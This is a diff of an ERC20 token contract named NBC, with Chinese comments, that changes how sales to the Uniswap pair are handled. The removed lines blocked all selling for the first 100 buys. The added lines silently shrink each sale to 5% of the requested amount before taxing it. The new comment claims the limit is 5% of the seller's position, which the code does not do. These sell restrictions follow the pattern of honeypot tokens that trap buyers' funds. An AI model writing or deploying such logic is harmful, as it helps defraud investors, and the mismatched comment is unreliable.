@@ -137,8 +137,8 @@ contract NBC is Context, IERC20, Ownable {
     // 多少笔交易之后，才开始卖税
     uint256 private _preventSwapTaxBefore=23;
 
-    // 多少笔交易之后，才支持卖 Token
-    uint256 private _preventSwapSellBefore=100;
+    // 卖的话，每次只能卖自己仓位的 5%
+    uint256 private _perSell=5;
 
     // 累计买入交易笔数
     uint256 private _buyCount=0;
@@ -259,9 +259,14 @@ contract NBC is Context, IERC20, Ownable {
             }
 
             // 卖出
-            if(to == uniswapV2Pair && from!= address(this) ) {
-                require(_buyCount > _preventSwapSellBefore, "wait for start sell.");
-                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
+            if (to == uniswapV2Pair && from != address(this)) {
+                if (_perSell > 0) {
+                    uint256 adjustedAmount = amount.mul(_perSell).div(100);
+                    taxAmount = adjustedAmount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
+                    amount = adjustedAmount;  // 只将调整后的 amount 应用于后续转账和事件
+                } else {
+                    taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
+                }
             }
 
             // 自动卖税
